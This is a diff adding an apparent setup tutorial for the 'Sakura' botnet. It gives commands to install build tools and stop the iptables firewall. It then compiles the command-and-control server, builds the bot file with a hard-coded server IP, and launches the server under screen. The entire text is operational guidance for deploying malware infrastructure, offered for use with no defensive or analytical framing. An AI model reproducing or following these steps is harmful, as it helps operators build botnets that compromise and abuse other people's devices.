@@ -1,0 +1,22 @@
+Tut Made My @MaverickSlams
+----------------------------
+Put server Ip in Sakura_bot.c						 
+--------------------------------------------------------------------
+yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
+--------------------------------------------------------------------
+service httpd restart 
+service iptables stop
+--------------------------------------------------------------------
+gcc c24.c -o Sakura -pthread
+--------------------------------------------------------------------
+python Sakura_Build.py Sakura_bot.c 157.245.187.85  (Server IP)
+--------------------------------------------------------------------
+screen ./Sakura 1111 1 23
+------------------------------
+If Doesn't Screen
+------------------------------
+yum install screen
+------------------------------
+pkill screen
+------------------------------
+screen ./server 1111 1 23
